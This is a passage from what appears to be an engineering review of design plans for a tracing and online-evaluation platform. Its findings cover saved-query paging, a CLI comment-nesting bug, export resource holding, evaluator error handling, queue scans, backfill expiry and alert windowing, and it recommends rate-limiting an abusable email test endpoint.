**Failure scenario.** A weaker implementer writing a new in-process commit path (for example J's experiment runs) follows § Commit API and calls `state.ingest.commit` from a handler. That reintroduces the M-4 cancel-safety bug D-G-38 fixed and bypasses the shutdown wait. Or a CSP edit is made from the design's string and drops `base-uri`/`form-action`.

**Suggested fix.** In 00-design.md:
- update the Status line to the merged PRs;
- replace the D-G-18, D-G-22 and D-G-34 summaries with the amended text, and add the D-G-38 and D-G-39 rows;
- say in § Commit API that request and background callers use `commit_in_task`;
- fix § Embedded UI's CSP and fallback rule;
- drop the memory-serve open item.

Or replace the decision table with a pointer to mvp-decisions § Track G so it cannot drift again.

**Verifier evidence.** 00-design.md:7 Status still names the branches claude/g-m3-impl, g-m4-impl and g-m5-impl. :34 says D-G-18 uses memory-serve and that release CI checks the embed. :38 says D-G-22 checks filter and search when the stream opens. :50 gives D-G-34 without the age and send-timeout limits. The table ends at D-G-37. § Commit API (~:184) says 'Track I ... calls `commit`', while the code uses commit_in_task (eval/test_run.rs:27,291). § Embedded UI (:243-244) gives the old CSP without base-uri/form-action and an SPA fallback for every path. The open item on memory-serve's API remains. i-online-eval and p-entitlements designs list this file under 'Read first'. One point weakens the claim: the D-G-35 and D-G-37 rows in the same table already supersede the D-G-18 memory-serve text.

### Track H — console

#### H-3 — Console lists saved queries with one limit=1000 request on the claim that this is the per-owner cap; shared views of other users make the visible set unbounded

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** plan-defect · **Owner:** H
- **References:**
  - docs/plans/h-console/README.md:102 ('The console lists saved queries with limit=1000, the per-owner cap')
  - docs/mvp-decisions.md:377 D-H-13
  - docs/plans/h-console/12-web-saved-queries.md:45 (Listing) and :974
  - web/src/api/queries.ts:332 (query { kind: 'sql', limit: 1000 })
  - web/src/components/sql/sql-console.tsx:79 and :104-118 (a ?view= missing from the first page is neither loaded nor dropped)
  - crates/server/src/meta/saved_views.rs MAX_VIEWS_PER_OWNER (per (project, owner) only)

**Problem.** D-H-6 caps views per (project, owner) at 1,000. A caller sees their own views plus every shared view of every other member, so the visible `sql` views of a project can far exceed 1,000. D-H-13 and H12 treat one `limit=1000` page as complete. When `next_cursor` is set, the menu silently omits the rest. A `?view=` link to a query that is not in the first page is never loaded: the effect only keeps the id, and there is no GET-by-id route.

**Failure scenario.** In a project where two analysts each shared 600 SQL queries, a third member sees 1,200 visible views. The menu shows only the oldest 1,000, with no hint that more exist. A colleague's shared link `/acme/app/sql?view=<id of the 1,100th>` opens the console with the old draft and never loads the query.

**Suggested fix.** Correct the D-H-13 rationale. Then either page through the list with `useInfiniteQuery` until `next_cursor` is null (or show a 'more saved queries exist' note and page on demand). Also add a way to load one view by id, such as `GET /saved-views/{id}`, or a `kind=sql&id=` filter, so `?view=` works beyond the first page. Add a page test where the list returns `next_cursor` and the target view is on page 2.

**Verifier evidence.** meta/saved_views.rs:330-338 counts views per (project_id, owner_user_id) only, so the 1,000 cap is per owner and shared views of other owners add to the visible set. web/src/api/queries.ts savedQueriesQuery sends {kind:'sql', limit:1000} with the comment 'all in one page (D-H-13: 1,000 is the per-owner cap)'. In sql-console.tsx, when ?view= is not in the listed page and next_cursor != null (complete=false), the effect just returns: the view is never loaded and nothing is shown to the user. The saved-view routes are GET list, POST, PATCH /{id} and DELETE /{id}; there is no GET /{id}.

#### H-4 — CLI placeholder scanner treats /* */ comments as non-nesting, but the server's GenericDialect nests them; H9 and H12 contradict each other

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** consistency · **Owner:** H
- **References:**
  - docs/plans/h-console/09-cli-query.md:508-515 ('The scan mirrors that tokenizer ... `/*` ... ends after the next `*/` (no nesting')
  - docs/plans/h-console/12-web-saved-queries.md:41 ('`/* … */` block comments, which **nest**')
  - ~/.cargo/registry/.../sqlparser-0.62.0/src/dialect/generic.rs:188-190 (supports_nested_comments → true)
  - crates/cli/src/query.rs:415-416 (find_sequence for '*/', no depth)
  - web/src/lib/sql/params.ts:79-90 (depth counter)

**Problem.** H9 says the CLI scan mirrors sqlparser 0.62's GenericDialect tokenizer, which the server uses to find `{name:Type}`. GenericDialect nests block comments, but the CLI ends a comment at the first `*/`. Text after an inner `*/` is then scanned as code, so a `'` there starts a phantom string literal that swallows real placeholders after the comment. H12's web scanner nests correctly, so the two clients disagree. Separately, H12 deliberately does not model `E'…'` backslash escapes, which GenericDialect supports, so the web scanner also diverges from the server in the other direction. H9's test 12 has no nested-comment case.

**Failure scenario.** `cetra query "SELECT /* outer /* inner */ don't */ count(*) FROM spans WHERE total_tokens > {n:Int}" --param n=5`. The server sees one nested comment and the Int placeholder `n`. The CLI closes the comment at the first `*/`, treats `'t */ … ` as an unterminated literal and stops scanning, so `n` is not a placeholder. It sends `"5"` as a string, and the server answers 400 with an ill-typed parameter error for a statement that is correct.

**Suggested fix.** Track nesting depth for `/*` … `*/` in `placeholder_types`, as web/src/lib/sql/params.ts does. Fix the H9 plan text. Add a test-12 case such as `/* a /* b */ c's */ {x:Int}` that yields `x` Int. Optionally record in H12 that the web scanner's `E'…'` gap means a spurious parameter input can appear (the server then says 'unknown parameter').

**Verifier evidence.** crates/cli/src/query.rs placeholder_types: '/' followed by '*' -> find_sequence(&chars, index+2, ['*','/']), with no depth tracking. The 09-cli-query.md plan says '(no nesting ...)' and claims it mirrors the GenericDialect tokenizer, which storage uses (query_text.rs:17 GenericDialect). sqlparser-0.62.0 generic.rs:188-190 supports_nested_comments returns true. 12-web-saved-queries.md:41-42 documents nesting for the web scanner and records the E'…' gap. So the CLI and web scanners disagree, and the CLI diverges from the server.

#### H-5 — An export whose client stops reading holds its memory admission with no bound; accepted only in the plan README, not in D-H-8 or spec

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** delivery-gap · **Owner:** H
- **References:**
  - docs/plans/h-console/README.md:71 ('The deadline is checked when the body is polled, so an authenticated client that stalls without disconnecting can hold its admission longer; accepted.')
  - docs/plans/h-console/05-sql-export.md § 2 step 4 note and § 3 LoggedExport
  - crates/server/src/routes/sql.rs LoggedExport (poll_next / Drop, ~lines 380-470)
  - docs/spec/09-api.md § live streams: the 30 s no-read rule (D-G-34) exists for SSE but not for exports
  - docs/mvp-decisions.md:372 D-H-8

**Problem.** The export stream owns the query's memory admission until it ends or is dropped. `timeout_ms` is checked only when hyper polls the body, and hyper stops polling while the peer's TCP window is full. A client that stays connected without reading therefore keeps the admission for as long as the connection lives, not for `timeout_ms`. Admission is shared by every query on the instance (all read routes, the console, MCP, alerts, evaluators). D-G-34 already solves the same problem for SSE with a 30-second no-read cutoff, but exports have no equivalent, and the trade-off is recorded only in the plan README.

**Failure scenario.** A member, or a client on a half-open connection, starts several Parquet or CSV exports and stops reading after the first chunk. Each one keeps its admission. Once `query.max_memory_total` is used up, every other read on the instance (trace lists, dashboards, alert evaluation) waits `admission_wait` and then gets 503 busy. This lasts until the kernel's TCP keepalive drops the connections, which can take hours.

**Suggested fix.** Give LoggedExport a write-idle watchdog: if the body is not polled for N seconds (for example 30, matching D-G-34) after an item was yielded, drop the inner stream so the admission is released. Log it with `kind="stalled"`. Alternatively, rely on an `axum`/hyper write timeout. Record the rule in D-H-8 and spec 05 item 8. Add a test that holds a `TestStream` without reading, advances time, and checks that a second query is admitted.

**Verifier evidence.** The README (~line 71) says the deadline is checked when the body is polled, and that a stalled authenticated client can hold its admission longer, 'accepted'. run.rs:157-204: export_stream keeps the deadline/sleep inside the stream, so it fires only when the body is polled. routes/sql.rs LoggedExport has only poll_next/Drop and no idle watchdog, and no write or idle timeout is configured in the server. D-G-34 (mvp-decisions.md:343) has the 30 s no-room rule for SSE streams only. D-H-8 and spec 05 do not mention the trade-off. Exploiting it needs an authenticated caller, so minor is right.

### Track I — online evaluation

#### I-1 — M4 I4.6 forbids touching writes.ts, but the online-rules prefix M3 must add makes writes.test.ts fail on post_online_rule_preview

- **Severity:** major · **Verdict:** CONFIRMED · **Kind:** plan-defect · **Owner:** I
- **References:**
  - docs/plans/i-online-eval/04-m4-triggers.md:755 (I4.6 Edit only: 'Not web/src/mocks/writes.ts … does not include online rules')
  - docs/plans/i-online-eval/03-m3-queue-rules.md:1117 (I3.5 edit list includes writes.test.ts) and :1176-1182 (adds post_online_rule, patch_online_rule, delete_online_rule, post_online_rule_resume to WRITE_OPERATIONS; 'writes.test.ts passes with LATER_TRACKS still empty')
  - web/src/mocks/writes.test.ts:59-83 (expected = POST/PATCH/PUT/DELETE operations under the covered prefixes; toEqual against WRITE_OPERATIONS)
  - claude/i-m3-impl: web/src/mocks/writes.test.ts adds `path.startsWith("/api/v1/projects/{project}/online-rules")`

**Problem.** writes.test.ts builds its expected list only from paths under fixed prefixes, then asserts it equals WRITE_OPERATIONS exactly. M3 I3.5 adds four /online-rules writes to WRITE_OPERATIONS but never says to add the /online-rules prefix, so as written the equality fails. The M3 implementation (local branch claude/i-m3-impl) fixed this the natural way: it added the prefix. M4 I4.6 then adds POST /online-rules/preview to openapi.json and explicitly forbids editing writes.ts, on the stale premise that the prefix is not covered. With the prefix in place, post_online_rule_preview is in `expected` but not in WRITE_OPERATIONS, so the test fails, and the plan forbids the only fix.

**Failure scenario.** The I4.6 implementer (Haiku) adds the operation, runs `just openapi` and `just check-web`. 'lists every account and admin write of the contract' fails on post_online_rule_preview. The plan says do not touch writes.ts, so the sub-phase either stops (STOP rule) or deviates without guidance, for example by removing M3's prefix and losing write-mock coverage for every online-rule write.

**Suggested fix.** M3 I3.5: say explicitly to add `path.startsWith("/api/v1/projects/{project}/online-rules")` to the covered prefixes. M4 I4.6: replace the 'Not writes.ts' paragraph. Either add post_online_rule_preview to WRITE_OPERATIONS and RESPONSES, answering static/online-rule-preview.json (this also gives `just web-dev` a working counter, and I4.8's default test handler stays as an override), or exclude non-mutating POSTs from the covered set by operation id with a comment. Add writes.ts and writes.test.ts to I4.6's edit list.

**Verifier evidence.** 04-m4-triggers.md:755 (also identical on claude/i-m3-impl) says 'Not web/src/mocks/writes.ts' because writes.test.ts's prefix list 'does not include online rules'. main's web/src/mocks/writes.test.ts:66-77 builds `expected` from a fixed prefix list (no online-rules) and asserts equality with WRITE_OPERATIONS. 03-m3 I3.5 (lines ~1176-1182) adds four online-rule writes to WRITE_OPERATIONS and lists writes.test.ts as editable but never says to add the prefix. As the plan stands, the M3 equality would fail. The M3 implementation branch claude/i-m3-impl adds `path.startsWith("/api/v1/projects/{project}/online-rules")` at writes.test.ts:76. With that prefix in place, I4.6's POST /online-rules/preview lands in `expected` but not in WRITE_OPERATIONS, and I4.6 forbids touching writes.ts, so the test fails and the plan blocks the fix.

#### I-2 — A judge model typo (provider 404) in one project's evaluator marks the org connection failing and pauses every rule on it, in a loop

- **Severity:** major · **Verdict:** CONFIRMED · **Kind:** plan-defect · **Owner:** I
- **References:**
  - docs/plans/i-online-eval/00-design.md:47 (D-I-14: a pause-class error on a rule job marks the connection failing and pauses every enabled rule in the org using it)
  - docs/plans/i-online-eval/00-design.md:33 (D-I-5: a 404 for a model typed in the test 'is pause-class but says nothing about the key', so tests mark failing only with the default model)
  - docs/mvp-decisions.md:213 (D160: 404 pauses)
  - crates/eval/src/judge/http.rs:118 (401/402/404 → Pause), :244 (model_not_found)
  - docs/plans/i-online-eval/03-m3-queue-rules.md:303 (Dispositions: Pause, judge → connection failing + pause_rules_of_connection) and :1283 (only a 401 test)
  - claude/i-m3-impl crates/server/src/eval/execute.rs:828-839 (ErrorClass::Pause → Pause::Connection with no model check)

**Problem.** Judge evaluators carry their own `model`, which can differ from the connection's default_model. Nothing checks it against the provider at save time. D-I-5 already recognises that a 404 on a non-default model says nothing about the connection, and it excludes that case for connection tests. D-I-14 and M3's dispositions treat every pause-class error on a rule job the same way. A 404 model_not_found therefore sets the org-wide connection to `failing` and pauses every enabled rule in every project of the org that uses the connection. D-I-24 lets a project `member` (not an admin) cause this.

**Failure scenario.** A member of project A saves a judge with model 'gpt-4o-mnii' on the org's OpenAI connection and enables a rule. The first rule job gets a 404, so the connection goes `failing` and the rules of projects B and C on that connection pause ('connection'). An org admin runs a connection test with the default model. It succeeds and resumes every 'connection' pause, including A's rule. A's requeued job runs, 404s again, and pauses everything again. The org's online evaluation flaps until someone finds A's evaluator.

**Suggested fix.** In D-I-14 and M3 § Job execution › Dispositions, apply D-I-5's distinction. A pause-class error whose provider status is 404 (or whose code is model_not_found), on a judge whose model is not the connection's default_model, pauses only the rules of that evaluator ('errors', detail = the error text). It neither marks the connection failing nor pauses other rules. Only 401, 402 and 403 (and a 404 on the default model) take the connection path. Add executor tests for both cases (a 404 on a non-default model pauses only that evaluator's rules; the connection stays ok), and update spec 06 § Online rules › Execution.

**Verifier evidence.** 00-design.md:33 (D-I-5) says a 404 on a model typed in a test 'says nothing about the key', so only default-model tests mark the connection failing. 00-design.md:47 (D-I-14) and 03-m3 Dispositions (~line 303) send every pause-class judge error on a rule job down the connection path (connection failing, every enabled rule using the connection paused) with no check on the model. crates/eval/src/judge/http.rs:118 classifies 404 as Pause, and :244 tests model_not_found as Pause. M2 lets an evaluator set its own config.model and does not check it against the provider when it is saved. A successful default-model connection test resumes all 'connection' pauses (D-I-14), so the flapping loop described in the finding follows.

#### I-3 — Every dispatch pass scans and window-sorts every queued, ready job, including the backlogs of paused rules and saturated connections

- **Severity:** minor · **Verdict:** PLAUSIBLE · **Kind:** plan-defect · **Owner:** I
- **References:**
  - docs/plans/i-online-eval/03-m3-queue-rules.md:712-733 (candidate query: ROW_NUMBER() OVER (PARTITION BY priority, project_id ORDER BY not_before, id) over all queued rows with not_before <= now, then rn <= 20)
  - docs/plans/i-online-eval/03-m3-queue-rules.md:1449 and :1476 (every worker finish calls wake; the dispatcher runs a pass per wake)
  - docs/plans/i-online-eval/00-design.md:44 (10 000 live enqueues per rule per hour), :47 (paused rules keep their queued jobs up to 24 h)
  - docs/plans/i-online-eval/03-m3-queue-rules.md:702 (skip_queued_of_rule updates all of a rule's queued rows in one write)
  - docs/plans/i-online-eval/00-design.md:423-426 (§ Risks covers only writer contention and sweeper reads)

**Problem.** The paused-rule and saturated-connection filters (`r.enabled = 1 AND r.paused_reason IS NULL`, `COALESCE(e.connection_id, e.id) NOT IN json_each(?2)`) run after the eval_jobs_ready index range on status='queued', and the window function sorts every surviving row before `rn <= 20`. A paused rule's backlog (up to 10 000 per hour, kept 24 h, so up to about 240 000 rows) and a rate-limited connection's backlog are read and joined on every pass. Passes run every second and after every finished job (16 workers). A budget pause also turns the whole backlog `skipped` in one writer transaction. No test or benchmark bounds any of this.

**Verifier correction.** The candidate scan and window sort read every queued, ready row, including those of paused rules and saturated connections, filtered only after the join. A paused rule stops getting new jobs (the sweeper skips paused rules), so the backlog is limited to what was queued when it paused. A large backlog of a rate-limited connection can still be re-sorted on every wake. Unbounded skip_queued_of_rule is one writer transaction.

**Failure scenario.** A busy rule's connection fails for a few hours. Its rules pause with a queue of about 50 000 jobs while manual and other rules' jobs keep finishing. Each finish wakes the dispatcher, which re-reads and window-sorts the 50 000 paused rows on the reader pool, many times a second. That load competes with API reads. When a budget pause hits the same rule, one writer transaction updates 50 000 rows and blocks claims, finishes and flushes.

**Suggested fix.** Bound the scan. Either exclude paused, disabled and saturated work through the index (for example a partial index on queued jobs, with the rule pause state copied onto the job, or a per-rule paused list bound like `saturated`), or cap the inner scan, for example by reading the next N ready rows per priority by index before the window. Make skip_queued_of_rule chunk its update (1 000 rows per write, like the flusher). Add a dispatch_once test or bench with a large paused backlog that asserts one pass stays under a fixed time, and list the risk in § Risks.

**Verifier evidence.** 03-m3:712-733: in the candidate query, the rule-pause and `saturated` filters come after the join, and ROW_NUMBER() runs over all queued, ready rows. The only index is eval_jobs_ready(status, priority, not_before) (line 508). skip_queued_of_rule is one UPDATE with no chunking (line 702). § Risks (00-design:420-426) does not cover this. The worst case is overstated, though. The sweeper (D-I-9, 04-m4:24) only matches enabled, unpaused rules, so a paused rule stops adding jobs. Its backlog is only what was queued when it paused, not 10 000 per hour for 24 h. No measurement shows the scan is too slow at realistic sizes.

#### I-4 — A backfill re-queue keeps the old created_at, so the job can expire before it runs and is missing from jobs_last_24h

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** plan-defect · **Owner:** I
- **References:**
  - docs/plans/i-online-eval/00-design.md:44 (D-I-11: backfill DO UPDATE resets status, kind, priority, counters, results, not_before and updated_at, but not created_at)
  - docs/plans/i-online-eval/00-design.md:58 (D-I-28: queued jobs whose created_at is older than 24 h, or 7 days for backfill, become skipped 'expired')
  - docs/plans/i-online-eval/03-m3-queue-rules.md:739 (prune step 2 by created_at) and :708 (counts_since by created_at, feeding jobs_last_24h)
  - docs/plans/i-online-eval/00-design.md:65 (D-I-25: backfill jobs expire after 7 days)

**Problem.** Rule and backfill jobs share a dedup key. M6's backfill enqueue re-queues an existing failed or skipped row in place, and D-I-11 lists every column it resets except created_at. Expiry (M3's prune) and the rule page counts (counts_since) both key on created_at. A failed rule job stays until finished_at + 7 days, so its created_at can be up to about 8 days old. The backfill-queued job then counts as older than the 7-day backfill expiry at once, and it never appears in jobs_last_24h.

**Failure scenario.** A rule job failed 6.5 days ago after sitting queued for 20 h, so its created_at is 7.3 days old. A user starts a backfill over that day. The row is re-queued as backfill with priority 2. If live load holds it behind rule jobs (accepted by D-I-6) until the next hourly prune, it becomes `skipped` / `expired` without running. Either way the rule page's 'Last 24 hours' does not count the re-queued job.

**Suggested fix.** In D-I-11's reset list (design and mvp-decisions) and the M6 plan, also set created_at = now on the DO UPDATE, or add a queued_at column that prune and counts_since use. State which one, so M3's prune and counts_since stay correct for M6.

**Verifier evidence.** 00-design.md:44 (D-I-11): the DO UPDATE reset list names status, kind, priority, the counters, error/result/usage columns, finished_at, not_before and updated_at, but not created_at. D-I-28 (line 58) and 03-m3 prune step 2 (~line 739) expire queued jobs by created_at (7 days for backfill), and counts_since (line 708) filters by created_at. A failed or skipped row is kept until finished_at + 7 days, so its created_at can be more than 7 days old when a backfill re-queues it. The next hourly prune would then expire it, and the rule page's 24-hour counts never include it.

#### I-5 — I4.5's shutdown_flushes_the_map test defers a needed sleep to I4.7, which cannot edit serve.rs

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** plan-defect · **Owner:** I
- **References:**
  - docs/plans/i-online-eval/04-m4-triggers.md:739-743 (sleep twice sweep_every 'once I4.7 exists; before it, no sweeper runs and one call is enough')
  - docs/plans/i-online-eval/04-m4-triggers.md:856 (I4.7 Edit only: no serve.rs)

**Problem.** The test lives in serve.rs and is written in I4.5, when no sweeper exists, so its implementer correctly omits the sleep. I4.7 adds the sweeper, whose per-tick refresh_rules can apply a tracked set read before the test's rule insert. But serve.rs is not in I4.7's edit list, and I4.7 has no instruction to revisit the test. The guard the plan itself says is needed is never written.

**Failure scenario.** After I4.7, bind's sweeper runs its first pass immediately with the DEFAULT timing. If that pass read the rules before the test inserted its rule, and calls set_tracked after the test's refresh_rules, the project is untracked. The test's observe is then ignored, no pending_traces row is flushed, and shutdown_flushes_the_map fails intermittently in CI.

**Suggested fix.** Have I4.5 write the test with the double refresh_rules and the sleep from the start (harmless without a sweeper), or add serve.rs (that test only) to I4.7's edit list with an explicit step.

**Verifier evidence.** 04-m4:739-743: the test is written in I4.5, and the sleep is to be added 'once I4.7 exists; before it, no sweeper runs and one call is enough'. I4.7's Edit-only list (04-m4:856) does not include serve.rs, and I4.7 has no step that revisits shutdown_flushes_the_map. So the race guard the plan says is needed is never written.

#### I-6 — Stale prerequisites and status text in the track I plans and design

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** consistency · **Owner:** I
- **References:**
  - docs/plans/i-online-eval/03-m3-queue-rules.md:7 ('This plan lives on branch claude/i-m3-plan')
  - docs/plans/i-online-eval/04-m4-triggers.md:8 ('lives on branch claude/i-m3-impl', a local branch that is not on origin)
  - docs/plans/i-online-eval/00-design.md:15-17 ('04-m4-triggers.md … not written yet') vs docs/roadmap.md:50 ('M1–M4 written')
  - docs/plans/i-online-eval/00-design.md:314 (§ Startup 'load the budget view') vs 03-m3-queue-rules.md:908 (loaded lazily, 'not at startup') and D-I-15
  - docs/plans/i-online-eval/03-m3-queue-rules.md:1164 ('no helper takes both path params and a status') vs crates/server/src/api_examples.rs:57 (example_accepted exists)
  - docs/roadmap.md:50 ('M3 is being implemented'; the implementation branch is not pushed)

**Problem.** Both plans now live on main, but their prerequisite checks name branches: claude/i-m3-plan is behind main, and claude/i-m3-impl exists only in a local worktree. The design's plan list still says M4 is not written. Its § Startup says the budget view is loaded at startup, while D-I-15 and M3 load it lazily. M3 I3.5 says no api_examples helper takes path params and a 202, but `example_accepted` already does.

**Failure scenario.** A fresh M4 implementer follows the prerequisite, tries to start from origin/claude/i-m3-impl, cannot find it, and stops, or starts from the stale claude/i-m3-plan. A reader of the design's § Startup adds a startup budget load that M3 deliberately does not have. I3.5 writes hand-rolled struct-update code when the helper exists.

**Suggested fix.** Replace the branch prerequisites with 'start from main once M3 (resp. M2) has merged' plus the file-existence checks already listed. Update 00-design § plan list (M1–M4 written) and § Startup ('the budget view is loaded lazily, D-I-15'). In I3.5, use `example_accepted("post_evaluator_run", params(...), "static/eval-job-queued.json")`. Push claude/i-m3-impl, or name it in the roadmap row, so 'being implemented' can be checked.

**Verifier evidence.** 03-m3:7 says 'lives on branch claude/i-m3-plan'. 04-m4:8 says 'lives on branch claude/i-m3-impl'. git ls-remote shows only claude/i-m3-plan and claude/i-m3-m4-plans on origin, so i-m3-impl is local only. 00-design.md:15 says '04-m4-triggers.md … not written yet', while roadmap.md:50 says 'M1–M4 written'. 00-design.md:314 § Startup says 'load the budget view', but 03-m3:908 says it is loaded on first check, 'not at startup'. 03-m3 I3.5 says 'no helper takes both path params and a status', but api_examples.rs:57 on main has example_accepted(operation_id, path_params, file), added in 8093f98 before the plan.

### Track K — alerts

#### K-1 — Score alerts drop scores created later than one window after their trace ended (online-judge, SDK feedback and annotation scores)

- **Severity:** major · **Verdict:** CONFIRMED · **Kind:** plan-defect · **Owner:** K (storage read, K1); spec 05/07 wording by the coordinator
- **References:**
  - crates/storage/src/reads/alerts.rs:262-301 (trace_id_plan: END_TIME >= window.from, trace start in [from - 1 day, to))
  - crates/storage/src/reads/alerts.rs:303-354 (score_value: created_at in window AND trace_id IN trace_id_plan)
  - docs/plans/k-alerts/01-storage-read.md § Private implementation, 'Trace-id semi-join' and 'ScoreAvg/ScorePassRate'
  - docs/mvp-decisions.md:447 D-K-3 ('on created_at for scores')
  - docs/spec/07-alerts.md § Rule model (score row) and docs/spec/05-query.md:138
  - docs/spec/06-evaluation.md:125-128 (trace-completion detector: 5 s idle, then queue and judge call)

**Problem.** D-K-3 and spec 07 say a score rule measures the scores *created* in [now − window, now). K1 reused the dashboard's semi-join, which keeps only traces whose end_time ≥ window.from and whose start_time ≥ window.from − 1 day. That bound is harmless for spans, which start inside the window, and for the dashboard's wide windows. For scores it adds a second condition: a score is counted only when it was created less than `window` after its trace ended. Online-judge scores come after the completion detector (≥ 5 s idle), the queue and an LLM call (up to 60 s, plus retries). SDK feedback and human annotations usually arrive minutes to days later. None of the 15 K1 tests has a score created after its trace's end plus the window (every test score is created at the trace's start).

**Failure scenario.** A `score` rule `helpfulness avg < 0.5` uses a 1m window, the default min_count is 10, and judge scores arrive about 70 s after each trace ends. Each evaluation at t uses from = t − 60 s, and the trace ended more than 60 s before t, so every score is filtered out. The count stays 0 < 10, the rule sits in `no_data` forever and never fires, though the scores are bad. With 5m or 15m windows the same thing happens under queue backlog or judge retries. A thumbs-down feedback score posted an hour after the conversation is never counted by any window shorter than 1h, and never by any rule once the trace is more than a day old.

**Suggested fix.** In K1's score_value, build the semi-join over the scores' traces without the END_TIME ≥ from bound. Bound the trace scan by a lookback taken from the scores themselves (for example traces with start_time ≥ window.from − N days, N stated in a decision), or apply the exclusions and filter through a join on trace_id with no time bound when the window is short. Record the rule in spec 07 and spec 05 § metrics (scores keep their trace regardless of when it ended), amending D-K-3. Add tests in reads/alerts.rs: a score created 10 min after its trace ended counts in a 5m window, and an annotation on a trace 2 days old counts in a 1h window.

**Verifier evidence.** crates/storage/src/reads/alerts.rs:264-301 trace_id_plan scans traces with start_time in [from-1day, to) and keeps only END_TIME >= window.from (l.287); score_value (l.303-325) requires scores.created_at in the window AND trace_id IN that plan. So a score is counted only if its trace ended at or after window.from: a judge, feedback or annotation score created more than `window` after its trace ended is dropped. Plan 01-storage-read.md l.167-188 prescribes this exactly; spec 05:138 defines the same semi-join for dashboard series, and D-K-3 (mvp-decisions:447) says scores are windowed on created_at with no mention of the extra trace-end bound. The K1 score tests (alerts.rs l.568-727) build scores with score_row(..., T0+MIN, ...), the same time as the trace, so no test has a score created after its trace's end plus the window. Not covered in the cross-track review.

#### K-3 — "Send test" and email channels relay mail to any address, with no rate limit or recipient check

- **Severity:** major · **Verdict:** CONFIRMED · **Kind:** security-privacy · **Owner:** K (with Q/P for the cloud policy)
- **References:**
  - crates/server/src/routes/channels.rs:228-290 (test_channel: no throttle, sends synchronously on every call)
  - docs/plans/k-alerts/08-deliver.md § 4 'Send test' and § 3 Email (one message per recipient)
  - docs/plans/k-alerts/03-types.md § validate (email: any 1–20 syntactically valid addresses)
  - docs/mvp-decisions.md:450-451 D-K-6, D-K-7
  - docs/spec/08-auth.md:27 (signup/forgot/resend limited to 5/min per IP and 3/hour per email precisely to stop mail abuse)
  - docs/spec/09-api.md (no general per-session API rate limit; only streams and MCP have one)

**Problem.** Any member of any org can create an email channel with 20 arbitrary, unverified addresses. Members include a cloud Free user who signed up and created their own project; alerts are core and run on Q's cells (D-K-15). Each POST /channels/{id}/test then sends 20 emails from the instance's SMTP sender, synchronously and with no limit. Project and rule names, controlled by that member, appear in the subject and body, as do links built from public_url. Real alert events add more through reminders (every ≥ 300 s) and fire/resolve flapping, across up to 100 rules × 10 channels per project. Spec 08 rate-limits every other outbound email per IP and per address for exactly this reason. K has no such limit and no decision accepting the risk. The same unthrottled test route also makes the server a POST relay to any public URL.

**Failure scenario.** A spammer signs up on a cloud cell, creates a project named with a phishing line and a lookalike URL, and adds 20 email channels of 20 victims each. A script then calls POST …/channels/{id}/test in a loop, sending thousands of messages a minute through the cell's Postmark/SES account. The provider suspends the sender, and password-reset and verification mail stops for every tenant on the cell.

**Suggested fix.** Record a decision (D-K-17) and amend spec 07/08: rate-limit test sends with the in-memory limiter spec 08 already uses (for example 5 per minute per user and per channel, 429 rate_limited); cap the alert emails per org per day (deliveries over the cap fail with a fixed message); and on instances with signup open, either restrict email recipients to verified members of the org or require a one-time confirmation from each recipient address. Add route tests for the 429 and the cap, update K10's test dialog for 429, and mention the limit in the 429 entry of the test_channel OpenAPI operation.

**Verifier evidence.** crates/server/src/routes/channels.rs:228-290 test_channel sends synchronously through send_one on every call with no limiter. Gating is only ProjectPerm::ManageAlerts, whose min role is Member (auth/roles.rs:212, 301). Sibling test endpoints are rate-limited: connections.rs:385 (test tests_are_rate_limited l.2148), eval/test_run.rs:58-71 (10 per minute) and feedback.rs:96. That makes the missing limit on channel tests an inconsistency, not a deliberate choice. D-K-6 allows 1–20 unverified email recipients, and D-K-7 sends one message per recipient. Spec 08:27 rate-limits auth mail. No decision covers alert-mail abuse. D-K-15 makes alerts core, including on the Free plan, so the cloud-signup abuse path is credible. Not in the cross-track review.

#### K-2 — Windowing on start_time caps every measured latency below the window length and under-samples slow and timed-out requests

- **Severity:** minor (reviewer: major) · **Verdict:** CONFIRMED · **Kind:** plan-defect · **Owner:** K (with the coordinator for the D-K-3 amendment)
- **References:**
  - docs/mvp-decisions.md:447 D-K-3 ('[now − window, now) on start_time')
  - crates/storage/src/filter/scope.rs:17-18 (time_window → traces.start_time, used by scoped_traces for trace measures)
  - crates/storage/src/reads/alerts.rs:~190 (LlmLatencyP95: window.predicate(spans::START_TIME))
  - crates/server/src/alerts/condition.rs:45 (latency threshold only checked > 0)
  - docs/plans/k-alerts/03-types.md § normalize_condition rules (no threshold vs window check)
  - docs/plans/k-alerts/12-web-editor.md § 3 (editor allows any window with any latency threshold)

**Problem.** A span is exported when it ends, so a span or trace visible at evaluation time t with start_time in [t − w, t) has end ≤ t. Its measured duration is therefore below w, ignoring client clock skew. A span of duration d is counted only if some evaluation lands in [end, start + w), a gap of w − d. Evaluations run every 60 s (every 300 s for windows of 1h or more), so long requests are counted with probability about (w − d)/interval, and never once d ≥ w. Traces still in progress add partial durations. The p95 that a latency alert reports is therefore biased toward fast requests, the opposite of what it should catch. error_rate has the same blind spot for requests that fail by timing out after more than one window. Nothing in D-K-3, spec 07, K3's validation or the editor states this or blocks a threshold at or above the window. No test covers spans longer than the window.

**Verifier correction.** Because windows are on start_time and spans arrive only once they end, a measured duration is always below the window. In practice this matters for the 1m window: a latency threshold of 60 s or more can never fire, calls longer than about w − 60 s are counted only part of the time, and timeouts longer than the window are missed by 1m error_rate. With 5m–24h windows the effect is limited to calls lasting minutes. Validation and the editor do not mention or block this. Either document it and refuse latency thresholds at or above the window, or window latency on end_time.

**Failure scenario.** A rule `latency_p95 (llm_span) > 60000 ms over 1m` can never fire: no counted span can last 60 s. A rule `> 20 s over 1m` sees a 45 s call only when an evaluation lands in the 15 s after it ends, so slow calls are mostly invisible and p95 stays low during an incident. A provider outage where calls hang 90 s and then fail is invisible to a 1m error_rate rule.

**Suggested fix.** Needs a user decision amending D-K-3. Either (a) window latency measures, and optionally the trace measures, on end_time: spans with end_time in [now − w, now), and traces whose end_time is in the window (root ended, or last_ingest older than a settle delay); or (b) keep start_time but refuse latency thresholds ≥ the window and state the bias in spec 07 and the editor's help text. With (a), update K1's AlertMeasure doc and tests, adding a span longer than the window that is counted once it ends, and update spec 07 § Rule model.

